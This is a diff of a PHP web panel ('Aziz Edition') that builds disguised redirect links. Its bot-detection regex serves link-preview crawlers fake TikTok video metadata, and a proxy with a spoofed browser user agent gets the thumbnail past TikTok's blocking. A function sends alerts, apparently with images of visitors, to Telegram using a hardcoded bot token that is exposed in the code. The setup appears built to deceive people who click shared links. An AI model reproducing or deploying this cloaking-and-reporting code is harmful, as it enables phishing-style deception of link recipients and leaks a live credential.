@@ -9,7 +9,7 @@ set_time_limit(0);
 session_start();
 
 // ==============================================================================
-// 🖼️ وسيط الصور العمودي (يتجاوز حظر تيك توك لفيسبوك)
+// 🖼️ وسيط الصور العمودي (يتجاوز حظر تيك توك ويعرض الصورة الحقيقية)
 // ==============================================================================
 if (isset($_GET['proxy_img'])) {
     $img_url = base64_decode($_GET['proxy_img']);
@@ -19,7 +19,6 @@ if (isset($_GET['proxy_img'])) {
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_TIMEOUT, 8);
-    // تمويه هوية البوت لكي تسمح تيك توك بتحميل الصورة
     curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
     $image_data = curl_exec($ch);
     $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
@@ -31,8 +30,7 @@ if (isset($_GET['proxy_img'])) {
         echo $image_data;
         exit;
     }
-    
-    // صورة احتياطية فقط في حال فشل كل شيء
+    // صورة بديلة فقط في حال فشل السيرفر في تحميلها (نادرة جداً)
     header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=720&h=1280&fit=crop"); 
     exit;
 }
@@ -83,7 +81,6 @@ try {
 
 } catch (Exception $e) { die("Database error: " . $e->getMessage()); }
 
-// دالة إرسال إشعار تلجرام
 function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_token = null) {
     if (empty($chat_id)) return;
     $token = $custom_token ?: '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
@@ -117,16 +114,16 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// دالة جلب بيانات تيك توك
+// ✅ دالة قوية جداً لاستخراج البيانات الحقيقية 100%
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'فيديو تيك توك', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=720&h=1280&fit=crop'];
+    $meta = ['title' => 'TikTok Video', 'image' => ''];
     
-    // المحاولة 1: oEmbed
+    // المحاولة 1: oEmbed API (أفضل طريقة)
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
         CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     ]);
     $response = curl_exec($ch); curl_close($ch);
     if ($response) {
@@ -136,7 +133,7 @@ function fetch_tiktok_exclusive_meta($url) {
         }
     }
     
-    // المحاولة 2: قراءة الصفحة مباشرة
+    // المحاولة 2: سحب الصفحة كاملة وتفتيش الكود المصدري
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
@@ -146,11 +143,18 @@ function fetch_tiktok_exclusive_meta($url) {
     $html = curl_exec($ch); curl_close($ch);
     
     if ($html) {
+        // 1. جلب العنوان
         if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
         }
+        
+        // 2. جلب الصورة من وسوم الميتا
         if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
             $meta['image'] = $matches[1];
+        } 
+        // 3. إذا فشل، نبحث داخل الـ JSON المصدري لتيك توك
+        elseif (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
+            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
         }
     }
     
@@ -229,7 +233,7 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
-            // استخدام الوسيط وإجبار الأبعاد العمودية (9:16)
+            // استخدام الوسيط لجلب الصورة وتجاوز الحظر
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
             
             header('Content-Type: text/html; charset=utf-8');
@@ -238,7 +242,7 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:description" content="شاهد الفيديو الآن">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
-            // أبعاد عمودية
+            // إجبار الصورة على أن تكون عمودية (9:16)
             echo '<meta property="og:image:width" content="720">';
             echo '<meta property="og:image:height" content="1280">';
             echo '<meta property="og:type" content="video.other">';
@@ -624,7 +628,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V18</p>
+                <p>Aziz Edition V19</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
